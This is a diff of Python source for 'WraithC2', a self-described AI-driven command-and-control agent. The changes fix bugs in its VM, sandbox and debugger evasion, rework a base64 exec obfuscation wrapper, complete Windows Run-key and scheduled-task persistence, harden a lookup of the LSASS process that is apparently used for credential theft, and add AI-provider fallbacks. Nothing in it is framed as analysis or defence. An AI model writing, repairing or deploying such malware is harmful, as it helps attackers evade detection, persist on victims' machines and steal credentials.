@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env python3
+#!/usr/bin/env python3
 """
 WraithC2  —  standalone AI-driven agent
 ------------------------------------------
@@ -136,7 +136,7 @@ class WraithAgent:
                 pass
         vm_processes = ["vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "vmwareuser.exe"]
         for proc in psutil.process_iter(['name']):
-            if proc.info['name'].lower() in vm_processes:
+            if proc.info['name'] and proc.info['name'].lower() in vm_processes:
                 return True
         return False
 
@@ -145,7 +145,8 @@ class WraithAgent:
         for s in sandbox_paths:
             if s in os.getcwd().lower():
                 return True
-        if psutil.cpu_count() < 2:
+        cpu_count = psutil.cpu_count()
+        if cpu_count is None or cpu_count < 2:
             return True
         if psutil.virtual_memory().total < 2 * 1024 ** 3:
             return True
@@ -357,8 +358,8 @@ class WraithAgent:
         basic base64-exec wrapper if the API is unavailable.
         """
         fallback = (
-            f"import base64,marshal,types\n"
-            f"exec(compile(marshal.loads(base64.b64decode({base64.b64encode(source_code.encode()).decode()!r})),'<c>','exec'))"
+            f"import base64\n"
+            f"exec(compile(base64.b64decode({base64.b64encode(source_code.encode()).decode()!r}).decode(),'<c>','exec'))"
         )
 
         if not self.api_key:
@@ -528,7 +529,7 @@ class WraithAgent:
         key_path   = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         key        = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
         value_name = ''.join(random.choices(string.ascii_letters, k=8))
-        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{sys.executable}"')
+        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
         winreg.CloseKey(key)
 
     def scheduled_task_persistence(self):
@@ -543,7 +544,7 @@ class WraithAgent:
     <Arguments>"{os.path.abspath(__file__)}"</Arguments>
   </Exec></Actions>
 </Task>"""
-        with tempfile.NamedTemporaryFile(suffix='.xml', delete=False, mode='w') as f:
+        with tempfile.NamedTemporaryFile(suffix='.xml', delete=False, mode='w', encoding='utf-16') as f:
             f.write(task_xml)
             xml_path = f.name
         task_name = ''.join(random.choices(string.ascii_letters, k=8))
@@ -764,7 +765,7 @@ class WraithAgent:
         try:
             lsass_pid = None
             for proc in psutil.process_iter(['pid', 'name']):
-                if proc.info['name'].lower() == 'lsass.exe':
+                if proc.info['name'] and proc.info['name'].lower() == 'lsass.exe':
                     lsass_pid = proc.info['pid']
                     break
             if lsass_pid is None:
@@ -1076,7 +1077,7 @@ class WraithAgent:
             for t in threads:
                 t.start()
             for t in threads:
-                t.join(timeout=10)
+                t.join()
 
             output = "\n".join(sorted(results)) or "No open ports found."
             self._send_result('net_scan', output)
@@ -1161,10 +1162,13 @@ class WraithAgent:
                     r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                     0, winreg.KEY_ALL_ACCESS,
                 )
+                value_names = []
                 for i in range(winreg.QueryInfoKey(key)[1]):
                     n, v, _ = winreg.EnumValue(key, i)
                     if sys.executable in v:
-                        winreg.DeleteValue(key, n)
+                        value_names.append(n)
+                for n in value_names:
+                    winreg.DeleteValue(key, n)
                 winreg.CloseKey(key)
             except OSError:
                 pass
@@ -1458,6 +1462,11 @@ class WraithAgent:
             return self._ai_call_openrouter(messages, max_tokens)
         elif provider == "openrouter" and NVIDIA_API_KEY:
             return self._ai_call_nvidia(messages, max_tokens)
+        elif provider == "anthropic":
+            if NVIDIA_API_KEY:
+                return self._ai_call_nvidia(messages, max_tokens)
+            elif OPENROUTER_API_KEY:
+                return self._ai_call_openrouter(messages, max_tokens)
         return None
 
     def process_prompt(self, prompt_text: str):
@@ -2350,10 +2359,13 @@ class WraithAgent:
         if not already_evaded:
             if self.check_vm_environment():
                 self.evade_and_relaunch("VM")
+                return
             if self.check_sandbox():
                 self.evade_and_relaunch("Sandbox")
+                return
             if self.check_debugger():
                 self.evade_and_relaunch("Debugger")
+                return
 
         self.establish_persistence()
         self.is_running = True
